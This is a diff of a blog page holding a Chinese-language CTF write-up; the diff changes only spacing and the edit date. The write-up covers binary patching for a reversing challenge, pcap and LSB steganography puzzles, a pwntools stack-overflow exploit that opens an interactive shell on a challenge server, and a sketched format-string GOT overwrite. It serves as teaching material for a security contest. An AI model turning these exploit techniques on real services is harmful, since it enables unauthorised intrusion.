@@ -46,7 +46,7 @@
 <meta property="og:image" content="https://blog.kyrios.cn/cnssr-2017-wp/img/cnss2017sto2.png">
 <meta property="og:image" content="https://blog.kyrios.cn/cnssr-2017-wp/img/cnss2017sto1.png">
 <meta property="article:published_time" content="2017-09-28T15:25:48.000Z">
-<meta property="article:modified_time" content="2021-02-24T06:47:21.752Z">
+<meta property="article:modified_time" content="2021-03-23T07:52:55.036Z">
 <meta property="article:author" content="Kyr1os">
 <meta property="article:tag" content="Writeup">
 <meta name="twitter:card" content="summary">
@@ -219,7 +219,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-02-24 14:47:21" itemprop="dateModified" datetime="2021-02-24T14:47:21+08:00">2021-02-24</time>
+                <time title="Modified: 2021-03-23 15:52:55" itemprop="dateModified" datetime="2021-03-23T15:52:55+08:00">2021-03-23</time>
               </span>
 
           
@@ -244,58 +244,58 @@
 <h3 id="touhouproject">TouHouProject</h3>
 <p>这个题建议动态调试，逻辑看起来可能比较清楚一些，适合萌新入门。</p>
 <h4 id="easy">Easy</h4>
-<p>直接进easy会发现拒绝访问，这种绕过最简单，直接定到输入后的逻辑查看原因。</p>
+<p>直接进 easy 会发现拒绝访问，这种绕过最简单，直接定到输入后的逻辑查看原因。</p>
 <p><img src="img/reth0.png" /></p>
-<p>在输入字符串的匹配流程中我们可以看到两个连续的strcmp函数。 第一个strcmp将输入字符串和"easy"比较。这里直接通过。第二个strcmp将输入字符串和"lunatic"比较，如果匹配失败则直接跳转到Access Denied。"easy"和"lunatic"肯定是不能匹配的。这里只要在验证的时候修改验证结果，防止跳到Access Denied那里即可。</p>
-<p>留意一下Access Denied的位置，我们让00007FF689286<strong>9FB</strong>处的跳转<strong>不执行</strong>而<strong>执行</strong>00007FF689286<strong>A01</strong>处的跳转，就可以直接拿到flag（毕竟说好的简单难度）</p>
+<p>在输入字符串的匹配流程中我们可以看到两个连续的 strcmp 函数。 第一个 strcmp 将输入字符串和 "easy" 比较。这里直接通过。第二个 strcmp 将输入字符串和 "lunatic" 比较，如果匹配失败则直接跳转到 Access Denied。"easy" 和 "lunatic" 肯定是不能匹配的。这里只要在验证的时候修改验证结果，防止跳到 Access Denied 那里即可。</p>
+<p>留意一下 Access Denied 的位置，我们让 00007FF689286<strong>9FB</strong> 处的跳转<strong>不执行</strong>而<strong>执行</strong> 00007FF689286<strong>A01</strong> 处的跳转，就可以直接拿到 flag（毕竟说好的简单难度）</p>
 <p><img src="img/reth01.png" /></p>
 <h4 id="normal">Normal</h4>
-<p>过这个题的方法就很多了，过normal的居然比easy多，直接从网上找现成外挂过的都有？？？ 反正面试遇到用现成外挂的选手就直接送走吧。</p>
-<p>目标是过关，方法肯定有很多，你可以去掉被弹判定，取消死亡判定，修改生命的数量等等。<del>你也可以直接像p姐姐一样硬扭过去（加油，我反正打不过）</del>。 这里主要讲一下我觉得简单的做法，直接干掉死亡判定。 这里其实给萌新留了一条线索，死亡判定的地方会打印一条"GameOver"这样的信息，我们在调试器里也可以直接搜索字符串定位过去。</p>
+<p>过这个题的方法就很多了，过 normal 的居然比 easy 多，直接从网上找现成外挂过的都有？？？ 反正面试遇到用现成外挂的选手就直接送走吧。</p>
+<p>目标是过关，方法肯定有很多，你可以去掉被弹判定，取消死亡判定，修改生命的数量等等。<del>你也可以直接像 p姐姐一样硬扭过去（加油，我反正打不过）</del>。 这里主要讲一下我觉得简单的做法，直接干掉死亡判定。 这里其实给萌新留了一条线索，死亡判定的地方会打印一条 "GameOver" 这样的信息，我们在调试器里也可以直接搜索字符串定位过去。</p>
 <p><img src="img/reth1.png" /></p>
-<p>看到熟悉的exit函数，可以确定GameOver就是这里。</p>
+<p>看到熟悉的 exit 函数，可以确定 GameOver 就是这里。</p>
 <p><img src="img/reth2.png" /></p>
-<p>出于减少异常的考虑，我决定干掉跳转到GameOver的语句，找一下前面地址的引用可以跟过去。</p>
+<p>出于减少异常的考虑，我决定干掉跳转到 GameOver 的语句，找一下前面地址的引用可以跟过去。</p>
 <p><img src="img/reth3.png" /></p>
-<p>选中的call是跳到GameOver的，可以看到执行call之前有一个无条件的jmp语句，所以我们只需要Nop掉00007FF6AA9DE079处的jle跳转，这个跳转指向call GameOver，就可以让GameOver这段代码不执行。</p>
-<p>顺便一提，获得flag需要在通关的同时获得150000分以上，有了无敌随便打打就过了。</p>
+<p>选中的 call 是跳到 GameOver 的，可以看到执行 call 之前有一个无条件的 jmp 语句，所以我们只需要 Nop 掉 00007FF6AA9DE079 处的 jle 跳转，这个跳转指向 call GameOver，就可以让 GameOver 这段代码不执行。</p>
+<p>顺便一提，获得 flag 需要在通关的同时获得 150000 分以上，有了无敌随便打打就过了。</p>
 <p><img src="img/reth05.png" /></p>
 <hr />
 <p><span id="misc1"></span></p>
 <h2 id="misc">Misc</h2>
 <p><span id="class"></span></p>
 <h3 id="上课小动作">上课小动作</h3>
-<p>Wireshark打开流量包，在tcp流里面翻一下能看到传输的文件是一个叫CNSS 2017的Word文档</p>
+<p>Wireshark 打开流量包，在 tcp 流里面翻一下能看到传输的文件是一个叫 CNSS 2017 的 Word 文档</p>
 <p><img src="img/skxdz0.png" /></p>
 <p>再之后这个就是文件的具体内容，直接抓下来</p>
 <p><img src="img/skxdz1.png" /></p>
-<p>Word打开拿到flag（其实你看到文件头有PK的话用zip打开翻那个XML里应该也能看到明文flag。） <img src="img/skxdz2.png" /></p>
+<p>Word 打开拿到 flag（其实你看到文件头有 PK 的话用 zip 打开翻那个 XML 里应该也能看到明文 flag。） <img src="img/skxdz2.png" /></p>
 <p><span id="library"></span></p>
 <h3 id="图书馆魅影">图书馆魅影</h3>
-<p>给的Hint是机器的序列号</p>
+<p>给的 Hint 是机器的序列号</p>
 <p><img src="img/tsg0.jpg" /></p>
-<p>由tag环境联想到环境变量，直接查看环境变量就可以</p>
+<p>由 tag 环境联想到环境变量，直接查看环境变量就可以</p>
 <p><img src="img/tsg1.jpg" /></p>
 <p><span id="cloud"></span></p>
 <h3 id="云上之灵">云上之灵</h3>
-<p>传统的LSB，直接stegsolve打开翻了一下顺序，最后可以在BGR顺序的最低有效位找到明文</p>
+<p>传统的 LSB，直接 stegsolve 打开翻了一下顺序，最后可以在 BGR 顺序的最低有效位找到明文</p>
 <p><img src="img/yszl2.png" /></p>
-<p>拿去解一下直接得到flag</p>
+<p>拿去解一下直接得到 flag</p>
 <p><img src="img/yszl1.png" /></p>
 <hr />
-<p><span id="2"></span> 下面两个是其他选手出的题@plusls <span id="pwn2"></span></p>
+<p><span id="2"></span> 下面两个是其他选手出的题 <span class="citation" data-cites="plusls">@plusls</span> <span id="pwn2"></span></p>
 <h2 id="pwn">PWN</h2>
 <p><span id="sto"></span></p>
 <h3 id="easymaze">Easymaze</h3>
-<p>程序丢进IDA看到输入名字的地方一个大写的栈溢出</p>
+<p>程序丢进 IDA 看到输入名字的地方一个大写的栈溢出</p>
 <p><img src="img/cnss2017sto2.png" /></p>
-<p>buf是一个char型变量，这里read可以读1000.</p>
-<p>进入栈空间里看一下，算出buf首地址到返回地址的距离 = 0x7a + 0x8 = 130。构造payload一把梭。这里注意一下方向键的问题就好。</p>
+<p>buf 是一个 char 型变量，这里 read 可以读 1000.</p>
+<p>进入栈空间里看一下，算出 buf 首地址到返回地址的距离 = 0x7a + 0x8 = 130。构造 payload 一把梭。这里注意一下方向键的问题就好。</p>
 <p><img src="img/cnss2017sto1.png" /></p>
 <p>exp: <span id="sto"></span> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">u = <span class="string">&#x27;\x1b\x5b\x41&#x27;</span></span><br><span class="line">d = <span class="string">&#x27;\x1b\x5b\x42&#x27;</span></span><br><span class="line">r = <span class="string">&#x27;\x1b\x5b\x43&#x27;</span></span><br><span class="line">l = <span class="string">&#x27;\x1b\x5b\x44&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.plusls.cn&#x27;</span>, <span class="number">17001</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(r + d*<span class="number">3</span> + r + d*<span class="number">4</span> + r*<span class="number">3</span> + u*<span class="number">2</span> + r*<span class="number">2</span> + d + r + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">130</span> + <span class="string">&#x27;\xd6\x18\x40\x00\x00\x00\x00\x00&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
 <p><span id="fmtstr"></span></p>
 <h3 id="猜老婆">猜老婆</h3>
-<p>输入那里存在格式化字符串漏洞。 大概思路把got表里printf改成system的地址就可以。 懒得写（懒癌晚期</p>
+<p>输入那里存在格式化字符串漏洞。 大概思路把 got 表里 printf 改成 system 的地址就可以。 懒得写（懒癌晚期</p>
 
     </div>
 
